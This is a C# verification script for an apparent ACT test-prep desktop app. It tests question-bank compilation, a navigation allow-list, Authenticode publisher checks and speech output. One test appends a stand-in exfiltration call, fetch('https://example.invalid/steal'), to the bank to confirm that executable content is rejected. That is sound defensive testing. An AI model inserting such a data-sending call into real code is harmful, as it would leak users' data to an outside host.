using ACTDrill.Desktop;

var repoRoot = Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "..", ".."));
var questionPath = Path.Combine(repoRoot, "questions.js");

var checks = new List<(string Name, Action Test)>
{
    ("Current bank compiles as data", () =>
    {
        var result = QuestionBankCompiler.Compile(File.ReadAllText(questionPath));
        Assert(result.QuestionCount == 280, $"Expected 280 questions, got {result.QuestionCount}.");
        Assert(result.PatternCount == 35, $"Expected 35 patterns, got {result.PatternCount}.");
        Assert(result.JavaScript.Contains("const ACT_QUESTIONS =", StringComparison.Ordinal),
            "Trusted output is missing ACT_QUESTIONS.");
    }),
    ("Executable bank payload is rejected", () =>
    {
        var malicious = File.ReadAllText(questionPath) + "\nfetch('https://example.invalid/steal');";
        AssertThrows<InvalidDataException>(() => QuestionBankCompiler.Compile(malicious));
    }),
    ("Malformed bank is rejected", () =>
    {
        var malformed = "const ACT_PATTERNS={x:{name:'x',rule:'x',cue:'x',example:'x'}};" +
                        "const ACT_QUESTIONS=[];const BANK_VERSION='bad';";
        AssertThrows<InvalidDataException>(() => QuestionBankCompiler.Compile(malformed));
    }),
    ("Known HTTPS links are allowed", () =>
    {
        Assert(ExternalNavigationPolicy.TryAllow(
            "https://www.act.org/content/act/en/products-and-services/the-act/test-preparation/free-act-test-prep.html",
            out _), "ACT.org should be allowed.");
    }),
    ("Custom protocols and unknown hosts are blocked", () =>
    {
        Assert(!ExternalNavigationPolicy.TryAllow("ms-settings:privacy", out _),
            "Custom protocol should be blocked.");
        Assert(!ExternalNavigationPolicy.TryAllow("https://example.com/", out _),
            "Unknown host should be blocked.");
        Assert(!ExternalNavigationPolicy.TryAllow("http://www.act.org/", out _),
            "Plain HTTP should be blocked.");
    }),
    ("Authenticode verifier checks trust and publisher", () =>
    {
        var powershell = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
            "PowerShell",
            "7",
            "pwsh.exe");
        Assert(File.Exists(powershell), "Signed PowerShell 7 executable was not found.");
        AuthenticodeVerifier.VerifyTrustedPublisher(powershell, "Microsoft Corporation");
        AssertThrows<InvalidDataException>(() =>
            AuthenticodeVerifier.VerifyTrustedPublisher(powershell, "Ollama"));
    }),
    ("Native speech renderer produces one complete WAV", () =>
    {
        var speech = NativeSpeechService
            .SynthesizeAsync("Three squared equals nine.", null, 0)
            .GetAwaiter()
            .GetResult();
        Assert(speech.WaveBytes.Length > 44, "Native speech WAV is empty.");
        Assert(
            speech.WaveBytes.AsSpan(0, 4).SequenceEqual("RIFF"u8),
            "Native speech output is not a RIFF WAV.");
        Assert(!string.IsNullOrWhiteSpace(speech.VoiceName), "Native voice name is missing.");
    })
};

var failures = 0;
foreach (var check in checks)
{
    try
    {
        check.Test();
        Console.WriteLine($"PASS  {check.Name}");
    }
    catch (Exception ex)
    {
        failures++;
        Console.Error.WriteLine($"FAIL  {check.Name}: {ex.Message}");
    }
}

Console.WriteLine($"{checks.Count - failures}/{checks.Count} verification checks passed.");
return failures == 0 ? 0 : 1;

static void Assert(bool condition, string message)
{
    if (!condition)
    {
        throw new InvalidOperationException(message);
    }
}

static void AssertThrows<T>(Action action) where T : Exception
{
    try
    {
        action();
    }
    catch (T)
    {
        return;
    }
    throw new InvalidOperationException($"Expected {typeof(T).Name}.");
}
